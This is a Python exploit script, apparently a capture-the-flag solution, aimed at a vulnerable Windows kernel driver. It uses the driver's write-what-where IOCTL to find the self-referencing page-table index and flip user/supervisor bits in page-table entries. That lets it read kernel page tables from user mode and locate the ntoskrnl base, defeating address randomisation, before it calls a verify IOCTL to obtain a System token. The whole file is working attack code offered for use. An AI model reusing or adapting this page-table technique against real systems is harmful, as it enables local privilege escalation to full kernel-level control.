from ioctl import *
from mem import *
from pwn import u64, p64
import pefile
import os

IOCTL_ORACLE = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
IOCTL_VERIFY = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
symbolic_link_name = r'\\.\Global\krnl'

mm_pte_base = 0
mm_pde_base = 0
mm_ppe_base = 0
mm_pxe_base = 0

def build_oracle_input(Where, What):
    """
    typedef struct _ORACLE_INPUT {
        ULONG64 Where;
        ULONG64 What;
    } ORACLE_INPUT, *PORACLE_INPUT;
    """
    return Where.to_bytes(8, 'little') + What.to_bytes(8, 'little')

def build_px_table_entry(ss):
    return 0xFFFF000000000000 | (ss << 39) | (ss << 30) | (ss << 21) | (ss << 12)

def get_px_table_entry(addr): # Get PXE entry for a given address
    return mm_pxe_base + ((addr >> 39) & 0x1FF) * 8

def get_pp_table_entry(addr): # Get PPE entry for a given address
    return mm_ppe_base + ((addr >> 27) & 0x1FFFF8)

def get_pd_table_entry(addr): # Get PDE entry for a given address
    return mm_pde_base + ((addr >> 18) & 0x3FFFFFF8)

def get_pt_table_entry(addr): # Get PTE entry for a given address
    return mm_pte_base + ((addr >> 9) & 0x7FFFFFFFF8)

def reload_base(ss, um: bool):
    global mm_pte_base, mm_pde_base, mm_ppe_base, mm_pxe_base
    mm_pte_base = (0xFFFF000000000000 if not um else 0) | (ss << 39)
    mm_pde_base = mm_pte_base | (ss << 30)
    mm_ppe_base = mm_pde_base | (ss << 21)
    mm_pxe_base = mm_ppe_base | (ss << 12)

def get_pfn(pte):
    return (pte & 0xFFFFFFFFFF000) >> 12

def load_ntoskrnl_symbols():
    system32_path = os.path.join(os.environ['WINDIR'], 'System32')
    ntoskrnl_path = os.path.join(system32_path, 'ntoskrnl.exe')
    if not os.path.exists(ntoskrnl_path):
        raise RuntimeError(f"ntoskrnl.exe not found at {ntoskrnl_path}")
    pe = pefile.PE(ntoskrnl_path)
    symbols = {}
    if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
        for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
            if exp.name:
                symbol_name = exp.name.decode('utf-8')
                symbol_rva = exp.address
                symbols[symbol_name] = symbol_rva
    return symbols

def get_symbol_address(symbol_name, symbols, nt_base):
    if symbol_name not in symbols:
        raise RuntimeError(f"Symbol {symbol_name} not found")
    symbol_rva = symbols[symbol_name]
    return nt_base + symbol_rva

print("Loading ntoskrnl.exe symbols...")
symbols = load_ntoskrnl_symbols()
print(f"Loaded {len(symbols)} symbols from ntoskrnl.exe")

with KernelDevice(symbolic_link_name) as device:
    print(f"Successfully opened device: {symbolic_link_name}")
    
    selfpte_idx = None
    for i in range(256, 512):
        address = build_px_table_entry(i) | (0x8 * 128)
        ts = build_oracle_input(address, 0)

        try:
            _ = device.ioctl(IOCTL_ORACLE, ts)

            # Successful Operation!
            selfpte_idx = i
            break

        except OSError as e:
            if e.winerror != 998: # STATUS_ACCESS_VIOLATION
                print(f"Unexpected error: {e}")
            continue
    
    print(f"Self PTE index found: {selfpte_idx}")

    def toggle_us(addr):
        ts = build_oracle_input(addr, (1 << 2))
        _ = device.ioctl(IOCTL_ORACLE, ts) # Flip U/S bit to access further
    
    def build_new_pte(pfn):
        return (pfn << 12) | 0x5
    
    reload_base(selfpte_idx, um=False)
    
    selfpte_pte = mm_pxe_base | (selfpte_idx * 8)
    toggle_us(selfpte_pte)
    print("Toggled U/S bit successfully!")
    
    nt_base = None
    
    loader_ppe_addr = get_pp_table_entry(0xFFFF000000000000 | (496 << 39)) # Initial Loader Mappings..
    loader_pxe_entry_addr = get_px_table_entry(0xFFFF000000000000 | (496 << 39))
    toggle_us(loader_pxe_entry_addr)
    loader_ppe_table = read_memory(loader_ppe_addr, 0x1000)

    unknown_ppes = []
    for i in range(512):
        entry = u64(loader_ppe_table[i*8:i*8+8])
        if entry & 0x1:
            print(f"PPE Entry PFN {i} ({hex(0xFFFF000000000000 | (496 << 39) | (i << 30))}): {hex(get_pfn(entry))}")
            unknown_ppes.append(i)
    
    print(f"Unknown PPE entries: {unknown_ppes}")
    
    for idx in unknown_ppes:
        pde_addr = get_pd_table_entry(0xFFFF000000000000 | (496 << 39) | (idx << 30))
        ppe_entry_addr = get_pp_table_entry(0xFFFF000000000000 | (496 << 39) | (idx << 30))
        toggle_us(ppe_entry_addr)
        pde_table = read_memory(pde_addr, 0x1000)
        
        for i in range(512):
            entry = u64(pde_table[i*8:i*8+8])
            if entry & 0x1:
                #print(f"PDE Entry PFN {i}, PPE-IDX {idx} ({hex(0xFFFF000000000000 | (496 << 39) | (idx << 30) | (i << 21))}): {hex(get_pfn(entry))}")
                if get_pfn(entry) == 0x100400: # Check if the PFN is the NT base. The physical address of the NT base is vary per OS. but actually you can check due integrity of 'FIRST PAGE' of NT kernel. I don't know why we can read first page (SMAP), but we can!
                    nt_base = 0xFFFF000000000000 | (496 << 39) | (idx << 30) | (i << 21)
                    break

        if nt_base:
            break

        toggle_us(ppe_entry_addr)
    
    toggle_us(loader_pxe_entry_addr)

    toggle_us(selfpte_pte) # Toggle back U/S.

    print(f"NT Base found: {hex(nt_base)}")

    try:
        _ = device.ioctl(IOCTL_VERIFY, p64(nt_base))
    except OSError as e:
        print("Failed to pwn:", e)
        exit(1)
    
    # Now we got System Token.

    os.system(f"whoami")
    os.system(f"whoami /groups")